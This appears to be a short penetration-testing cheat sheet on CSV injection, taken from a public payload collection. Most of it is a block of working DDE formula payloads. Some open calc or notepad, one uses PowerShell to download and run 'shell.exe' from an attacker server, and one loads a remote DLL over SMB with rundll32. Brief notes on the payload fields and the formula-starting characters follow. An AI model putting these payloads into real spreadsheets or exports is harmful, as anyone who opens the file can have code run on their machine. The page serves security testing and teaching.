# CSV Injection

## CSV Injection

Many web apps allow users to download items to a CSV file, such as invoice templates or user settings. Many people choose to open the CSV file in Excel, Open Office, or Libre Office. When a web application fails to validate the contents of a CSV file, the contents of a cell or several cells may be executed.

### Exploit

Basic exploit with Dynamic Data Exchange

```
# pop a calc
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0

# pop a notepad
=cmd|' /C notepad'!'A1'

# powershell download and execute
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0

# msf smb delivery with rundll32
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

Technical Details of the above payload:

* `cmd` is the name the server can respond to whenever a client is trying to access the server
* `/C` calc is the file name which in our case is the calc(i.e the calc.exe)
* `!A0` is the item name that specifies the unit of data that a server can respond to when the client is requesting the data

Any formula can be started with

```
=
+
–
@
```

Extracted from here:

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection#exploit" %}
